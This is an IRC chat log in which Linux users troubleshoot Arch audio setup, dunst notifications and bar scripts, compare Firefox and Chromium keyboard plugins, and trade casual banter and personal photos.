07:52         dcat │  my eardrum popped, and now I always bump into people on my right
07:53  thang1thang │  explosion? damn
07:53  thang1thang │  my group masturbatoins never got THAT violent..
07:54  thang1thang │  (but really, what happened to get the explosion?)
07:54         BigE │  not with that attitude
07:54  thang1thang │  dude I was like, 8
07:54  thang1thang │  your arm only has so much stamina

07:55         dcat │  shitty quality
07:55         dcat │  but the best explanation of what LLI is
07:55  thang1thang │  right
07:56  thang1thang │  forgot my speakers still broke
07:56         dcat │  what happened to them>
07:56         dcat │  ?*
07:57  thang1thang │  oh
07:57  thang1thang │  newish arch install
07:57  thang1thang │  haven't gotten the drivers and everything working right
07:57  thang1thang │  it's (probably) just as simple as typing the terminal command to turn the speakers on
07:57         dcat │  gpasswd -a <your suername> audio
07:57         dcat │  sudo alsactl init
07:57  thang1thang │  however I'll also need to bind said stuff to my media keys eventually
07:58         dcat │  you probably need sudo for gpasswd too
07:58  thang1thang │  alsactl command not found
07:59  thang1thang │  probably distro differences, I'll look it up on the arch wiki
07:59         dcat │  sudo pacman -S alsa-utils?
07:59  thang1thang │  installing now
07:59  thang1thang │  what do the alsa utils do?
07:59         dcat │  alsamixer and amixer
08:00         dcat │  you probably need to run alsamixer to unmute it too
08:00  thang1thang │  oooh alsamixer's gui is cool
08:01         dcat │  probably need to logout and in again
08:02  thang1thang │  okay Audio-mut is disabled now
08:03  thang1thang │  okay it's working
08:03  thang1thang │  just gotta figure out how to turn the normal speakers off and keep headphones on
08:04         dcat │  I think jack does that automatically
08:04  thang1thang │  oh I'm stupid
08:05         quit │  NeoTerra
08:05  thang1thang │  I had my hearing aids set to "audio and headphones" and couldn't tell the difference between the headphones and speakers
08:05  thang1thang │  so I thought the speakers were on and not the headphones
08:05  thang1thang │  it works now lol

08:18         dcat │  yeah
08:18         dcat │  I know it's mean and all
08:18  thang1thang │  I liked it when it was short on the sides and pushed up and forward better

08:20  thang1thang │  any way to use alsa to auto mute the speakers if I unplug the headphones?
08:20  thang1thang │  like if I turned the volume up, then plugged in headphones and took 'em out it would mute anyway?
08:21         dcat │  it's *nix
08:21         dcat │  there's always a way
08:21  thang1thang │  lol
08:21  thang1thang │  Im sure there is, I was just wondering if you knew one off the top of your  head
08:23         dcat │  can't say that I do
08:23  thang1thang │  ah well, I'll figure it out
08:25         BigE │  reddit.cm is available for 4K
08:25         BigE │  lul
08:25  thang1thang │  wut?
08:26         dcat │  idgi
08:26  thang1thang │  reddit.com is a website
08:26      jjumbii │  .cm
08:26  thang1thang │  I figured he typed it wrong
08:27  thang1thang │  he meant the domain reddit.cm is on sale for 4k?

08:27      jjumbii │  dont know if anyone likes electronic music, but that shit is smooth
08:27      akacase │  4K is a type of display, too.
08:27      akacase │  rather, resolution.
08:27  thang1thang │  yeah, that confused me lol
08:28      akacase │  less ambiguity BigE, plz.
08:28  thang1thang │  8K UHD is 7680x4320

08:29      jjumbii │  anyone want to send me some dmt
08:29  thang1thang │  If it's 4K HD it should be 7680x4320 -_-
08:30  thang1thang │  since 1K HD is 1920x1080 (as in, 1000 pixels on the vertical)
08:30      akacase │  3840 pixels × 2160 line
08:30      akacase │  *s
08:30         BigE │  no
08:30      akacase │  is 4K, source is wiki though, could be disputed.
08:30         BigE │  4K resolution is width
08:30         BigE │  not height
08:31  thang1thang │  yeah I know
08:31  thang1thang │  1920x1080p is HD resolution yes?
08:31  thang1thang │  also called 1k HD...
08:31         BigE │  they have moved away from the 1080p and 720p and 1440p naming scheme of measuring the verticle pixels
08:31         BigE │  and are not at horizontal
08:31         BigE │  now*
08:31  thang1thang │  who the hell did that?
08:31  thang1thang │  and that's retarded
08:31         BigE │  whoever came out with the first 4k horizontal display I suspect

08:32  thang1thang │  4k UHD apparently is 3840x2160 ("lines")

08:41      jjumbii │  well no more tripping on salvia
08:42      akacase │  so sad.

08:43      akacase │  I don't smoke anymore.
08:44      jjumbii │  ah, neither do i
08:45  thang1thang │  why no more tripping on saliva?
08:45      akacase │  because it's an unpredictable drug.
08:45  thang1thang │  yeah, definitely
08:46  thang1thang │  I was just wondering whether you weren't using it by preference or if some law changed
08:46      akacase │  I don't smoke, in general.
08:46      jjumbii │  its just interesting to see a new drug come up and see them make it illegal

08:51  thang1thang │  how the hell can you install arch linux
08:51  thang1thang │  with the devel option
08:52  thang1thang │  and not get python installed?
08:52      akacase │  not sure, I don't use Linux.
08:52      akacase │  perl works in lieu of python.
08:53  thang1thang │  how odd
08:53      akacase │  quite.
08:54  thang1thang │  my most hated thing about python would have to be how it pays attention to your fucking white space
08:54  thang1thang │  what kind of self respecting programming language cares about your dumbass linebreaks?
08:56      akacase │  not sure, I've never used, or written anything in it.
08:56  thang1thang │  what languages have you used before?
08:56      akacase │  C and Java, which the latter I work in professionally.
08:56  thang1thang │  ahh
08:57      akacase │  I also know SH, but I rarely use that nowadays.
08:57  thang1thang │  know how in C you can write a forloop as for(paramaters){everythinginhere} and it works?
08:57      akacase │  yes.
08:57  thang1thang │  it doesn't do that in python
08:57  thang1thang │  if you write for(paramaters){everything} you would get a different output or outright failure
08:58       fenriz │  does anyone know if dunst supports "on-click"
08:58  thang1thang │  than if you did it the for(paramaters) /linebreak { /line break everything /linebreak } /linebreak
08:58      akacase │  that's sad, but if you learned how to program that way, I could see its attraction.
09:00  thang1thang │  yeah it is sad. And I guess I can see the attraction
09:00  thang1thang │  but 99% of everything in python is programmed to just break if the format spacing isn't followed
09:01  thang1thang │  so there's not much (if anything) that does one thing if written one way AND/OR another thing if spaces are put somewhere else
09:01  thang1thang │  so really it's just kinda... useless?
09:01      akacase │  hehe, I doubt it, annoying is more like it.

09:08  thang1thang │  googled dunst

09:09       fenriz │  i'm trying to join #archlinux but i kep going to UH's #archlinux which is empty.
09:09          evo │  ./disconnect
09:09          evo │  then connect to freenode, then archlinux
09:09  thang1thang │  We have an archlinux channel?
09:09       fenriz │  i think so?
09:09          evo │  nah but the server is setup to let anyone create channels
09:10         dcat │  fenriz:
09:10          evo │  when you join an empty one its made I believe
09:10  thang1thang │  ah that explains it

09:10  thang1thang │  I can never remember who said what on here ;-;
09:10       fenriz │  dcat: hmm, this is what ewechat returned to me:   irc: command "join" must be executed on irc buffer (server or channel)
09:10  thang1thang │  but I was talking one day and mentioend I had installed #archlinux (joking around with the hashtags) and he replied he was mod of #archlinux 
09:10  thang1thang │  that's probably how he did it
09:11          evo │  ./part first 
09:11       fenriz │  i see
09:11       fenriz │  thanks!
09:11          evo │  Unless you want another seperate channel rather than just one open
09:11  thang1thang │  weird
09:12  thang1thang │  who wanted the info about dunst again?
09:12       fenriz │  any dunst users here? ._.
09:12       fenriz │  meee!
09:12  thang1thang │  oh right
09:12          evo │  me
09:12  thang1thang │  you're trying to get dunst to close on a click right?
09:12       fenriz │  well, for a gmail widget i'm writing
09:12       fenriz │  i would like to click on the notification and it opens gmail.clom on a browser
09:12  thang1thang │  yeah the close message on right-click is built into dunst ._.
09:12       fenriz │  that would be ideal.
09:12  thang1thang │  oooh that's different
09:12       fenriz │  yeah.
09:12  thang1thang │  well let's see here... let me poke in his github real quick
09:13       fenriz │  sure
09:16  thang1thang │  okay
09:16  thang1thang │  you're gonna have a "rule.c" file
09:17  thang1thang │  messages can be matched by 'appname' 'summary' 'body' or 'icon'
09:17  thang1thang │  you can override timeout/urgency/foreground/background and format
09:17  thang1thang │  you can also specify a script that gets run when the rule matches
09:18  thang1thang │  however the script will run the second the rule matches
09:18      akacase │  you could set the delay in the script.
09:19  thang1thang │  that'll still make it auto-run though
09:19  thang1thang │  in windows there's a SYSTEM("PAUSE") function you can use
09:19  thang1thang │  pauses the script until it gets a character in the cmd prompt
09:19  thang1thang │  getchar does pretty much the same thing
09:20  thang1thang │  with that in mind (I don't know if you'd use it or not)
09:20  thang1thang │  you should be able to modify the script so it'll run on notification CLOSE rather than notification open
09:22       fenriz │  hmm
09:22       fenriz │  wihtout sounding too lazy, that does seem like a lot of work
09:22       fenriz │  i guess i could sense the appname of it, say "Gmail"
09:22  thang1thang │  right now the run-script-on-notification has an if statement
09:22       fenriz │  and have it run a script when i click clos?
09:22       fenriz │  where can i see that?
09:22  thang1thang │  when it passes the script runs
09:23  thang1thang │  the function itself to define the notifications and the run-script-on-notification
09:23  thang1thang │  is inside the notification.c file
09:23       fenriz │  ah i see
09:23      akacase │  start another thread, test using a loop.
09:23       fenriz │  so like i would have to mod the .c file and recompile?
09:23  thang1thang │  yeah
09:23  thang1thang │  akacase, what do you mean by starting another thread?
09:23      akacase │  run a background process.
09:24  thang1thang │  and have it loop checking for the dismissal of the notification?
09:24      akacase │  yes.
09:24  thang1thang │  if you're going to do that wouldn't it be a hell of a lot more elegant to just modify the script thing inside the notifications.c itself?
09:25          evo │  Do you really need to use dunst?
09:25          evo │  like at all
09:25  thang1thang │  I recommended it to him, actually. It was the most complete notification thing I've found so far
09:25      akacase │  hah, this is amusing.
09:25       fenriz │  evo: well, coming from notify-send, dunst is pretty sweet.
09:25       fenriz │  i like the amount of configuration it offers.
09:25  thang1thang │  what's amusing? 
09:26       fenriz │  notify-send is fucked up in the sense that when I click on a notification, it doesn't go away, it just hangs there and blurs.
09:26      akacase │  dicussion over a notification program.
09:26  thang1thang │  lol
09:26  thang1thang │  this is linux what can I say?
09:26  thang1thang │  we like our customization and get totally anal over every small thing about it
09:27          evo │  The reason it doesn't go away is it has a timer and hovering over it stops the timer
09:27          evo │  The blurring is just an effect for when you hover over it
09:27       fenriz │  thang1thang2: amen
09:27       fenriz │  fucking folks at Unity
09:27       fenriz │  Ubuntu*
09:27          evo │  I stopped using notifications at all
09:28          evo │  osd notifications*
09:28          evo │  And just started piping everything into BAR with my own scripts and such
09:28  thang1thang │  I would do that
09:28      akacase │  I just have mutt running, that's all.
09:28  thang1thang │  but I don't even have my bar working because I'm stupid
09:29       fenriz │  evo: that's what i was thinking, but in my pipe to bar, i have the sleep set to 0.5s so my volume would be responsible.
09:29       fenriz │  if i were to dump gmail checking script there, it would be strange to check my gmail every 0.5 seconds.
09:30      akacase │  your Android phone does it about that much.
09:30  thang1thang │  can't you isolate the redraw of the .5 per script thing?
09:30      akacase │  if you have an Android phone, that is.
09:30  thang1thang │  my android phone doesn't, thanks. I make mine behave lol
09:30       fenriz │  thang1thang2: i'm interested....what do you mean by the redraw of the .5 per scrip thing?
09:30  thang1thang │  well you have your thing to set at sleep .5 right?
09:30       fenriz │  the only script i care about that has 0.5 sleep is the volume.  i dont wanna "increase button"  and then like 5 seconds later, I see the volume bar go up.
09:30       fenriz │  yes, 
09:30  thang1thang │  can you just pull out everything from what you pipe to bar
09:30  thang1thang │  and put each one in a function
09:31       fenriz │  wait, let show you what i have so far:
09:31  thang1thang │  and then just put all the functions into a "main' and pipe THAT to the bar
09:31  thang1thang │  (put it in a pastebin damnit)
09:31       fenriz │  will do.
09:31  thang1thang │  that way you could set sleep different for each 'function' and the variables would be contained per function

09:32          evo │  You can see I don't use my email function for the very same reason.
09:32  thang1thang │  lol
09:33       fenriz │  what do you see thang1thang2 , is my code too spaghetti-ed?
09:33  thang1thang │  hmm
09:33  thang1thang │  it's actually pretty neat lol
09:33       fenriz │  \o/
09:33          evo │  But I can get around it by running the script seperately and writing a temp file with something like: NEW or NONE if no new mail, then if [ ! $(cat tempfile | grep NONE)] then show icon.. blah
09:33  thang1thang │  clock updates every 5s right?
09:34       fenriz │  at the moment, it is 1s.
09:34       fenriz │  down at the while loop :)
09:34  thang1thang │  got it
09:35  thang1thang │  yeah your fix is easy as shit for bar
09:35  thang1thang │  you have "while true -> do"
09:35  thang1thang │  and then you echo "S" and then all your functions
09:35  thang1thang │  and you have it refresh every 1 second
09:35  thang1thang │  adding gmail in there is just a matter of taking the 1s out
09:35  thang1thang │  and at the end of each function, write "sleep x"
09:36  thang1thang │  the trickiest part will be refreshing your bar itself every .5 seconds or so
09:36  thang1thang │  and having the functions only RUN whenever they're done sleeping
09:36  thang1thang │  if whoever coded the bar did it correctly, that should be built in with the sleep command
09:37  thang1thang │  question, though. Why do you have bar and dzen2, are they not both doing the same thing?
09:37       fenriz │  that would be so ideal.  if each invidual function ran on its own accord.
09:37       fenriz │  oops, i am not using dzen at all. 
09:38       fenriz │  that is extraneous shit from what i got this off of bspwm/examples
09:38       fenriz │  in that repo.
09:38  thang1thang │  scriptwhore
09:38  thang1thang │  (its ok I forgive you)
09:38   EmperorDAZ │  https://github.com/chrishunt/git-pissed
09:38       fenriz │  at the moment  my dilemna is volume() { sleep 3s}     and if i also have date() { sleep 1s}
09:38  thang1thang │  ?
09:39       fenriz │  if i call it like so:     $(volume) and $(date)
09:39       fenriz │  i think what's gonna happen is that volume is gonna run for 3 seconds, THEN date follows after volume is done.
09:39  thang1thang │  mmm
09:39       fenriz │  so in total execution time, it takes a total of 4 seconds.
09:39  thang1thang │  try it out?
09:39       fenriz │  that's what would happen if i pluck out the "1s" and have each function with their own sleeps.
09:40  thang1thang │  uhh
09:40  thang1thang │  that's what I said to do in the first place
09:40  thang1thang │  oh nvm I read your reply wrong
09:40       fenriz │  lol
09:40  thang1thang │  anyway... did you actually test it out?
09:40       fenriz │  in an ideal world:  that example with volume and date should run its course in 3 seconds.
09:40       fenriz │  i haven't.
09:40       fenriz │  i will though.
09:41  thang1thang │  Put 1s in everything and then 3s in for the while(true)
09:41  thang1thang │  if the time updates every 3 seconds it's working right [so far]
09:41  thang1thang │  then try it with time as 3 seconds and bar refresh rate as 1 second
09:41  thang1thang │  if time updates every 3 seconds, it'll work with gmail
09:41          evo │  Weird, I'm not using sleep at all.
09:42  thang1thang │  what do you have running in your bar, evo?
09:42       fenriz │  earlier i tried using usleep 500000, my cpu nearly went on fire.
09:42       fenriz │  thang1thang2: thanks, i am going to go give that a shot.
09:42          evo │  clock, volume, currently playing track in mpd, and my workspace display
09:42  thang1thang │  usleep? or sleep?
09:42       fenriz │  usleep lol
09:42  thang1thang │  the fuck does usleep do?
09:42         join │  vompatti
09:42         mode │  +v vompatti
09:43  thang1thang │  evo: You shouldn't need sleep for any of those functions
09:43  thang1thang │  if you don't set a sleep, I believe it defaults to something like .1s
09:44          evo │  Yeah the only thing that would have trouble is email
09:44          evo │  Atleast in the way the function is setup in my script
09:44     vompatti │  morning
09:44          evo │  Which I don't really like anyway
09:44       fenriz │  usleep allows you to specify sleep times in milli/micro seconds.
09:44  thang1thang │  yeah, I'll go check what not setting a sleep does to the script
09:45  thang1thang │  ahhh got it
09:45       fenriz │  do people ever pos ttheir githubs here?
09:45  thang1thang │  to be honest
09:45  thang1thang │  most everyone on the server already knows most of the githubs on here
09:45  thang1thang │  but go ahead and post yours if you want, I'd like to see it
09:46       fenriz │  not sure if trap, or honest
09:46       fenriz │  lol
09:46  thang1thang │  honest lol
09:46       fenriz │  i only know of earsplit's
09:46       fenriz │  since his "why bspwm" post on reddit exploded
09:46  thang1thang │  earsplit's got his bspwm github...
09:46  thang1thang │  and about 3/4ths of the regular #unixhub chatters
09:47  thang1thang │  post to unixhub fairly regularly with more or less the same usernames
09:47  thang1thang │  and since a lot of 'em post their configs by just linking the github account...
09:47       fenriz │  aah i see.
09:47       fenriz │  i don't know this cuz i never go on UH forums
09:47       fenriz │  even though i made an account
09:47       fenriz │  "funriz"
09:47       fenriz │  lol
09:47       fenriz │  i tried to spice it up, but failed.
09:47  thang1thang │  I never really go on the UH forums anyway
09:47  thang1thang │  I meant /r/unixporn
09:47  thang1thang │  but I made a brain fart
09:48       fenriz │  github.com/esn89
09:48       fenriz │  the interesting stuff for my bspwm is in dotfiles
09:48       fenriz │  i even included a screenie
09:48  thang1thang │  datface
09:48  thang1thang │  is face of one who is drowned 
09:48  thang1thang │  in puuuussssssssyyyyyyy
09:49       fenriz │  datface is, unfortunately, hasn't netted me any.
09:49       fenriz │  once when i was 19
09:49  thang1thang │  once when you were 19?
09:49  thang1thang │  Better than me so far
09:49  thang1thang │  of course I got about 6 months before you win, so there's still time
09:49       fenriz │  haha
09:50          evo │  github.com/Evolution0
09:50          evo │  dotfiles mainly
09:50          evo │  And empty repo
09:50       fenriz │  nice
09:50       fenriz │  NO PIC?!
09:50       fenriz │  :(
09:50          evo │  I need to remove bar and fork tbar instead
09:50  thang1thang │  lol
09:51          evo │  tbucks fork
09:51  thang1thang │  why tbar over bar?
09:51       fenriz │  thang1thang2, let's see yours.
09:51  thang1thang │  my github?
09:51          evo │  tbuck added borders
09:51  thang1thang │  mine doesn't have much of anything tbh
09:51       fenriz │  ah
09:51       fenriz │  in all honesty, i'm just curious in what all of yall look like.
09:51  thang1thang │  Only files in it right now are left over remnants from when I was trying to create an install.sh
09:51          evo │  well it makes the "underline" wrap around
09:51       fenriz │  wher ethe fuck are my fellow asian bretheren.
09:51  thang1thang │  (I don't have a picture on mine either)
09:51       fenriz │  HOLLA AT ME.
09:52       fenriz │  thang1thang2: ah i see.
09:52  thang1thang │  I can grab a picture from my dropbox though, think I have some more recent ones on there than my facebook...
09:52          evo │  Eh I'll get my 20 yr old neck beard long haired glasses wearing self up there eventually
09:53          evo │  I am the image of the stereotype
09:53  thang1thang │  oh god no
09:53          evo │  to a T
09:53  thang1thang │  I have images of me before my haircut
09:53  thang1thang │  back when I resembled the beatles
09:53       fenriz │  let's see a before/after :D
09:53  thang1thang │  ewwwww
09:53  thang1thang │  fine -_-
09:53          evo │  My hair is the same length as my sisters
09:53  thang1thang │  niice
09:54       fenriz │  evo it looks metal as fuck, long hair.
09:54       fenriz │  thang1thang2: but yeah, whip up the dropbox pic.
09:54  thang1thang │  https://www.dropbox.com/s/5ch3m46rqj6kz2j/2013-08-21%2022.08.52.jpg
09:54  thang1thang │  that (should) work
09:54  thang1thang │  and that would be the before
09:55  thang1thang │  lol, it's actually so old it's before my jaw surgery, that's funny
09:55       fenriz │  cool dude
09:55       fenriz │  do you wear hats?
09:55          evo │  Yeah I got a pic around here somewhere with my long hair and riding a custom chopper my grandfather made
09:55  thang1thang │  nope
09:55       fenriz │  you can pull off a toque pretty well with that hair.
09:55        z3bra │  fenriz, he does, can't you see it ?
09:55  thang1thang │  I don't really ever wear hats, I don't like them
09:56  thang1thang │  my hair just curls that way naturally lol
09:56       fenriz │  z3bra: you've been waiting all this time to let that out haha
09:56        z3bra │  yeah :p
09:56  thang1thang │  let what out? .-.
09:56      akacase │  you guys are sooo young, wow, I feel old.
09:56       fenriz │  that line "he does, can't you see it"
09:56  thang1thang │  oh, lol
09:56          evo │  There are older people on here I belive
09:56       fenriz │  akacase: i maybe oldest here lol
09:56          evo │  believe*
09:57        z3bra │  22 yo here
09:57  thang1thang │  yeah, they're just dead by now
09:57       fenriz │  24
09:57  thang1thang │  (Imsosorry)
09:57       fenriz │  though i've been told i look like i'm 18
09:57       fenriz │  lmao
09:57  thang1thang │  you do
09:57  thang1thang │  sorry
09:57      akacase │  fenriz, proof.
09:57       fenriz │  that picture was when i was ..23 i think
09:57       fenriz │  i just posted my picture o_o
09:57          evo │  I played minecraft with a 40+ year old guy
09:57  thang1thang │  it's in his github
09:57       fenriz │  or yo mean proof of age?
09:57  thang1thang │  to be honest, fenriz
09:58      akacase │  pic. proof of age is pretty crazy.
09:58          evo │  Was pretty damn chill, spent so much time building a gigantic base.. vanilla
09:58  thang1thang │  you'd gain about 10 years and 50 pounds of sexy if you changed to an undercut style of haircut that looks good on asians
09:58  thang1thang │  wait wut, vanilla?
09:58  thang1thang │  that crazy bastard...
09:58       fenriz │  what on earth is an undercut?
09:58       fenriz │  o_o
09:58  thang1thang │  not sure whether to be impressed or call a mental institution
09:58          evo │  Yeah this was back in the original alpha/beta run
09:58          evo │  When bukkit was new
09:59  thang1thang │  the asian version of an undercut requires thick straight as fuck asian hair
09:59  thang1thang │  which you have I assume :p
09:59          evo │  So I was about 16-17 then, he must be about 50 now and I bet still plays mc
09:59       fenriz │  or so like, shaved sides?
09:59  thang1thang │  undercut is basically short on the sides
09:59  thang1thang │  longer on top
10:00      akacase │  ok, here you kids go.
10:00      akacase │  me and the mrs: http://www.hostmypicture.com/?v=8127971010.jpg
10:00  thang1thang │  you can vary the shortness on the sides to basically shaven, and the top however longish as you want
10:00       fenriz │  akacase: dude, you look like  amovie star
10:00  thang1thang │  I'd probably keep your sides at about 1/3rd of an inchish
10:00      akacase │  fenriz: you clean up when you start working, it's pretty cool.
10:00  thang1thang │  nice flower tie
10:00       fenriz │  thang1thang2: i'll keep that in mind.   but if i leave the top long, i have a feeling i need to go in to get the sides done everyso often.
10:01  thang1thang │  you do
10:01       fenriz │  akacase: :)
10:01       fenriz │  akacase: do you have a before?
10:01  thang1thang │  I'd keep your top length about the normal size now
10:01      akacase │  when I was young?
10:01  thang1thang │  and sides probably much shorter
10:01  thang1thang │  and then you wanna gel and style the top part
10:01       fenriz │  when you weren't clean.
10:02  thang1thang │  you actually have a super defined jawline, fenriz
10:02       fenriz │  thang1thang2: there goes my routine of "roll out of bed, brush and catch the bus " haha
10:02      akacase │  I have one from 7 years ago.
10:02       fenriz │  i try to squeeze in as much sleep as i can.
10:02  thang1thang │  lol
10:02  thang1thang │  undercuts look fine with no gel as well
10:02       fenriz │  thang1thang2: thanks. :P
10:02  thang1thang │  my current style is an undercut without gel, but the top is getting a little too long
10:02      akacase │  fenriz: http://www.hostmypicture.com/?v=2263221003.jpg
10:02  thang1thang │  so my hair's starting to roll to the side like in my before picture
10:03  thang1thang │  amazing what a haircut and a beard can do to a man huh
10:03       fenriz │  akacase: haha, definitely the first picture is awesomer.
10:03  thang1thang │  http://data2.whicdn.com/images/36401134/Asian-Men-Spiky-Hairstyles-2012-for-short-hair_large.jpg
10:03       fenriz │  thang1thang2: YOO show me
10:03      akacase │  being humble, it was at a wedding, so we were dressed to impress.
10:04  thang1thang │  you could pull off that hairstyle so hard, fenriz
10:04  thang1thang │  but lose the sideburns, it's not 2005
10:04       fenriz │  dude you just turned asian.
10:04  thang1thang │  that's not me you idiot
10:04       fenriz │  yeah the sideburns look ridic.
10:05       fenriz │  just found this:   http://forums.unixhub.net/showthread.php?tid=619&page=4&highlight=picture
10:05       fenriz │  how old is jjmbi?
10:05       fenriz │  i think i could be his dad.
10:05  thang1thang │  https://www.dropbox.com/s/jk9mj2wp8pqee3g/2013-09-17%2017.49.57.jpeg
10:05  thang1thang │  this is my current facebook profile picture
10:06  thang1thang │  to be fair that's an art project
10:06  thang1thang │  it could be any pic of him
10:06       fenriz │  thang1thang2: lookin good.
10:06  thang1thang │  thanks
10:06  thang1thang │  that's with my head tilted back and my jaw slack
10:07  thang1thang │  before the surgery the lower part of my jaw
10:07  thang1thang │  used to be about an inch and a half or so behind what it is now
10:07       fenriz │  was it an underbite?
10:07  thang1thang │  overbite
10:07  thang1thang │  one hell of an overbite
10:07       fenriz │  i had a friend who had a major underbite, to fix it, her oral surgeon knocked her out
10:07  thang1thang │  I could touch my bottom canines to the back molars of my front jaw if I tried hard enough
10:07       fenriz │  then broke her jaw in like 1028301283 different places
10:08  thang1thang │  they did that to me too
10:08       fenriz │  thang1thang2: on holy shit that's a different level.
10:08  thang1thang │  but they only had to break the jaw in two places
10:08       fenriz │  sounds really scary haha
10:08       fenriz │  i only ever had braces.
10:08  thang1thang │  I had braces for 8 years
10:08  thang1thang │  and two years of two different types of headgear
10:08  thang1thang │  and THEN the jaw surgery
10:08  thang1thang │  my front two teeth used to be at a 45 degree angle
10:09  thang1thang │  the dog's my hearing dog by the way :) her name's lupita
10:10  thang1thang │  oooh dude I figured out how to scroll up finally
10:10       fenriz │  nice :D
10:10  thang1thang │  apparently if you hit escape then p or n it'll go up and down in irssi with this config
10:10  thang1thang │  idk why or how to change it but I finally figured the fucker out
10:10  thang1thang │  https://www.dropbox.com/s/ppkv5rrbyeihiem/2013-09-23%2022.10.09.jpg
10:10  thang1thang │  that's a better pic of my dog
10:11       fenriz │  is she always by your side?
10:11  thang1thang │  almost always
10:11  thang1thang │  she's with me and she's a service dog so she goes everywhere
10:11  thang1thang │  school, church, museaums, everything
10:12  thang1thang │  this would be me with my new* haircut when I style it
10:12  thang1thang │  https://www.dropbox.com/s/eh4bubgsn2j12yo/2013-09-27%2007.37.05.jpg
10:12  thang1thang │  however, I haven't styled it in, like, a couple months because of laziness 
10:13  thang1thang │  huh apparently I don't have any images of me that are newer than like 3 months...
10:13       fenriz │  i think that's whats gonna be like fo rme
10:13       fenriz │  lol
10:13       fenriz │  styling is gonna be like "for the first 2 days, then ...ehhh"
10:15          BigE│  BigE|Away
10:15       fenriz │  you know how in zshrc
10:16       fenriz │  the pgaeup and pagedown keys are normally for scrolling through history of your commands?
10:16       fenriz │  is there a way of making pageup and pagedown scroll through the output
10:16       fenriz │  say if i go "pacman -Ss lib"
10:16       fenriz │  it's gonna show me like 87981729381723 lib* packages
10:16       fenriz │  can i make it so that pageup allows me to scroll up through the output and not my command history?
10:16  thang1thang │  do it the smart way?
10:17  thang1thang │  pacman -Ss lib | grep whatyouactuallywant
10:17       fenriz │  no no no
10:17       fenriz │  not so much as in "i can't use pacman"
10:17       fenriz │  but more of for general use
10:17  thang1thang │  oh you wanna scroll through it
10:17       fenriz │  like i run a script, and the output is HUGE
10:17       fenriz │  i want to do it in that case as well
10:17  thang1thang │  tbh I just use the scroll on my mouse...
10:17       fenriz │  (trust me, i'm a certified pacman user)
10:18       fenriz │  hmm
10:18       fenriz │  i'm on my laptop, donm't relaly have a mouse
10:18       fenriz │  and the touchpad thing "okay" at best.
10:18       fenriz │  would prefer something more tactile.
10:18  thang1thang │  yeah, I hear you on that
10:18  thang1thang │  I'm lucky my macbook's scrolling is so pretty, even on linux
10:18  thang1thang │  best part. Scrolling and general mouse usage is 100x better on linux than on windows with my trackpad
10:19  thang1thang │  there's only ONE guy making a 3rd party driver for windows
10:19  thang1thang │  and his program's okay except it's a PITA to install and you have to reinstall it every week or buy it
10:19       fenriz │  haha
10:19       fenriz │  well, part of my reason is that
10:19       fenriz │  i want a setup that's completely keyboard centric.
10:19  thang1thang │  same here
10:20       fenriz │  i'm using a plugin for browsing called Vimium
10:20       fenriz │  so that's pretty sweet
10:20  thang1thang │  on chrome?
10:20       fenriz │  the only time i really need to use the touchpad/mouse
10:20       fenriz │  is when i highlight to copy and paste
10:20       fenriz │  yeah, chromium
10:20  thang1thang │  To be completely honest I switched to firefox
10:20  thang1thang │  100% for one single plugin
10:20  thang1thang │  pentadactyl
10:21  thang1thang │  it's like vimium only about 500 fucking times more powerful
10:21       fenriz │  i came from firefox
10:21       fenriz │  i just felt that chromium's faster in everyway.
10:21  thang1thang │  because you can customize EVERYTHING on firefox with a extension
10:21  thang1thang │  while extensions have a lot of restrictions on chrome
10:21       fenriz │  that's true.
10:21       fenriz │  but for loading pages, starting up the damn thing.
10:22       fenriz │  chromium seems to take the cake on speed.
10:22  thang1thang │  I can hit i to go into "caret" mode and I can move the mouse cursor with hjkl
10:22  thang1thang │  and then v to go into visual
10:22  thang1thang │  hjkl auto selects text
10:22       fenriz │  btw, what is caret mode?
10:22       fenriz │  i lways accidnetally hit f7
10:22       fenriz │  and see it pop up
10:22  thang1thang │  caret mode is a custom mode in pentadactyl
10:22  thang1thang │  it's like insert mode but with hjkl you move the mouse cursor
10:22  thang1thang │  rather than your scrolling
10:23  thang1thang │  it allows you to select text on your screen without touching the mouse
10:23  thang1thang │  then you can copy by hitting escape and then yanking
10:23       fenriz │  oh snap...
10:23       fenriz │  maybe that's what i need to complete my transofmration
10:23       fenriz │  THIS ISN"T EVEN M FINAL FORM.
10:23       fenriz │  okay now that i got that outta the way...
10:23       fenriz │  perhaps i should revisit firefox.
10:23  thang1thang │  and you can paste output to a new tab, or current tab, or switch windows and paste it there...
10:23  thang1thang │  yeah, that's just one of many reasons why I switched to firefox. Pentadactyl is insanely powerful
10:24  thang1thang │  the only thing it seems to break on is flash interaction
10:24  thang1thang │  like flash games or what not
10:25       fenriz │  what about Vimperator vs Pentadactyl?
10:25  thang1thang │  pentadactyl was forked from vimperator
10:25  thang1thang │  by about 80% of the original dev team of vimperator
10:25       fenriz │  lol
10:25       fenriz │  god damn
10:25       fenriz │  mutiny
10:25  thang1thang │  and they've continued to actively develop it ever since while vimperator's been meh
10:25  thang1thang │  vimperator is comparable to vimium in terms of utility
10:26  thang1thang │  pentadactyl is a whole different ballgame
10:26     vompatti │  guys
10:26     vompatti │  do you use instagram?
10:26       fenriz │  vimperator tends to keep an ugly bar at the bottom of my ff
10:26       fenriz │  vimium just gets outta my way.
10:26       fenriz │  vompatti: no wei.
10:26     vompatti │  =/
10:26  thang1thang │  uh
10:26          evo │  Eh I just make my own userchrome and use a keybind plugin
10:26  thang1thang │  the "ugly bar" thing is really useful
10:27     vompatti │  I just use stock ff
10:27  thang1thang │  it's your current address
10:27     vompatti │  or dwb
10:27  thang1thang │  it also tells you what you just copied
10:27          evo │  Should be one up on my github to imitate dwb
10:27  thang1thang │  it's like powerline for firefox
10:27  thang1thang │  rather than just having a silly address bar
10:27  thang1thang │  I have an instagram, I don't use it regularly though
10:28  thang1thang │  evo: userchrome?
10:28     vompatti │  link
10:28     vompatti │  me gonna follow mah nerdy fellows
10:28  thang1thang │  I've posted an image
10:28  thang1thang │  maybe once in the history of mankind
10:28       fenriz │  lol
10:28  thang1thang │  I post more often to fricking facebook than instagram
10:28       fenriz │  what IS instragram anyways?
10:28     vompatti │  I've posted like 10 or so
10:28  thang1thang │  imagesharing site for phones
10:29  thang1thang │  it's like /r/pics but self contained and it has a phone app w/filters
10:29       fenriz │  aaah
10:29       fenriz │  how does it different from snapchat?
10:29  thang1thang │  hence the verbe "instagrammed"
10:29       fenriz │ doesn't own a smartphone.
10:29  thang1thang │  it works like facebook
10:29  thang1thang │  but your updates are picture uploads
10:29       fenriz │  i have this:  http://cdn2.gsmarena.com/vv/pics/nokia/nokia-n82-04.jpg
